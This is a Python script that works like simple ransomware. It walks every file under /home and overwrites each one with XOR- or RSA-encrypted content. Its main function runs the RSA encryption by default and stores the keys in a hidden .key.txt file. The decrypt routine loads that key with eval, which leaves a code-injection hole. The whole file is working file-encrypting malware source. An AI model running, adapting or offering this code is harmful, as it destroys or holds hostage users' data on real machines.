from Cipher import *
import os

class File:
    class XOR:
        @staticmethod
        def Encrypt():
            keyXOR = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, _, files in os.walk('/home'):
                    for file in files:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        encrypted_data = Cipher.XOR.encryptBytes(data,keyXOR)
                        
                        with open(file_path, 'wb') as f:
                            f.write(encrypted_data)
                        print(f"Encrypted: {file_path}")

            print("XOR Encryption completed.")

        @staticmethod
        def Decrypt():
            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, _, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    decrypted_data = Cipher.XOR.decryptBytes(encrypted_data, key)
                    
                    with open(file_path, 'wb') as f:
                        f.write(decrypted_data)
                    print(f"Decrypted: {file_path}")

            print("XOR decryption completed.")
        
    class RSA:

        @staticmethod
        def Encrypt():
            directory = os.getcwd()
            keyRSA = Cipher.RSA.generate_keypair(10000,100000)
            public_key,private_key = keyRSA
            
            with open(os.path.join(directory, '.key.txt'), 'w') as key_file:
                    key_file.write(f"{public_key}\n")
                    key_file.write(f"{private_key}")

            for root, _, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r') as f:
                        data = f.read()

                    encrypted_data = Cipher.RSA.encrypt_RSA(data,public_key)

                    with open(file_path, 'w') as f:
                                f.write(' '.join(map(str, encrypted_data)))
                    print(f"Encrypted: {file_path}")

            print("RSA Encryption completed.")

        @staticmethod
        def Decrypt():
            directory = os.getcwd()

            try:
                with open(os.path.join(directory, '.key.txt'), 'r') as key_file:
                    keys = key_file.readlines()
                    private_key = eval(keys[1])
            except FileNotFoundError: #Error handling if RSA.Encrypt is not run before Decrypting
                 print("Error: The .key.txt file does not exists\nDid you run File.RSA.Encrypt()")


            for root, _, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r') as f:
                            encrypted = f.read()
                    encrypted = list(map(int, encrypted.split()))
                    decrypted = Cipher.RSA.decrypt_RSA(encrypted, private_key)
                    with open(file_path, 'w') as f:
                        f.write(decrypted)
                    print(f"Decrypted: {file_path}")

            print("RSA decryption completed.")
            os.remove(os.path.join(directory, '.key.txt')) #removing hidden key file

            

def main():

    File.RSA.Encrypt()
    #File.RSA.Decrypt()

if __name__ == "__main__":
    main()